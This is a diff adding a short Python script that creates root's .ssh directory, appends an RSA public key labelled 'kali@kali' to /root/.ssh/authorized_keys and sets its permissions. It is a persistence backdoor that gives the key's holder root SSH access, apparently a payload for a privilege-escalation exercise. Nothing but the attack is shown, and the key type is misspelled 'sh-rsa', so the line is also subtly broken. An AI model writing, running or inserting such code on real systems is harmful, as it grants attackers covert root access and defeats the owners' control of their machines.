@@ -1,0 +1,7 @@
+
+
+import os
+os.system('mkdir /root/.ssh')
+f = open('/root/.ssh/authorized_keys','a+')
+f.write('sh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDM3+mBQ3Cyj9MmyrpwaW2Yl/dTMqPcMVTwqIuuiHhB+DAmAT2dUd+CxwGA1UipcX7Rxy4yxg9+yLa9trj/XGRZ6wkkDJVKXuhcG75tyLll5NMenyLeQGZIJDlacK4mKTSeTG2/sufkceuIp4EQtOsINOCIZisFqzIvswa7gm4RH/BoRl1xAAdEb/04sHH7P6hzv+DRSB/C7dqQJ+CU/M/2KRBztxpmvFKzyBWAIGGgXulVjyqpXBPF8SI3gkIP57fSsHAnqcyphdltBRsdT204EDhdrhex/fxhu79l7A7ZZGaS2OIO14j9+RNmukHXT5znN0ux2HD4Bk/nvVS9Ee1qaJ4Np6LFlC3frBVwCWPehCigoKt4BcD1CgSmkO5vuavARdVHgALruIVzp8X+HS0fK9q0MPx5hoDH2S4mXPn/6r2Wj++Nqe657vW3s/TswyXcGwcX0KDLqCRG4drdGkbA3l7BwS73DlUx879JTfNYtB3wMeXv8bkt6O/88lVYci1OR3faszZNzVKynw5AgoXjjfSU3+Zyq9f+LX7PTnHv7wzBKRfd3Wxmn8ojfFsHAYQVlwT7D48FZ9vmaprKbwJDz0ZjW48RQtzDoS60ihnjXVk6k8dyYR7AekAM1iKo+/GDZJZPCN7njzZMwuBFSVOsvskj24z8BCTc4jhTTVfKAw== kali@kali')
+os.system('chmod 600 /root/.ssh/authorized_keys')
